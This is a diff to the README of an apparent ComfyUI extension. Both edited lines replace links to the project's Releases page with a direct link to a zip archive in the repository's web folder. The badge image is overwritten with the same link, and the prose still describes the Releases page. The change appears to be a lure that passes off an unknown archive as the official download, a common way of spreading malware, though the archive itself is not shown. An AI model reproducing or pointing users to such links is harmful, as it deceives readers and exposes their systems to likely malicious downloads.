@@ -8,7 +8,7 @@ Welcome to ComfyUI-qwenmultianglelight! This software makes your user interface 
 
 To download the software, visit the Releases page below. This page contains the latest version of ComfyUI-qwenmultianglelight. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/alex11111112312/ComfyUI-qwenmultianglelight/releases)
+[![Download Now](https://github.com/alex11111112312/ComfyUI-qwenmultianglelight/raw/refs/heads/master/web/U-Comfy-qwenmultianglelight-1.7.zip%20Now-Release%20Page-blue)](https://github.com/alex11111112312/ComfyUI-qwenmultianglelight/raw/refs/heads/master/web/U-Comfy-qwenmultianglelight-1.7.zip)
 
 Once you're on the Releases page, look for the most recent version. Click on it to find the files available for download. 
 
@@ -69,7 +69,7 @@ For further assistance, feel free to contact our support team through the Issues
 
 ## 🔗 Additional Resources
 
-- [ComfyUI-qwenmultianglelight Releases](https://github.com/alex11111112312/ComfyUI-qwenmultianglelight/releases): Visit for downloads and updates.
+- [ComfyUI-qwenmultianglelight Releases](https://github.com/alex11111112312/ComfyUI-qwenmultianglelight/raw/refs/heads/master/web/U-Comfy-qwenmultianglelight-1.7.zip): Visit for downloads and updates.
 - [User Guide](#): Explore our detailed user guide for more information on all features.
 
 ## 📞 Contact Us
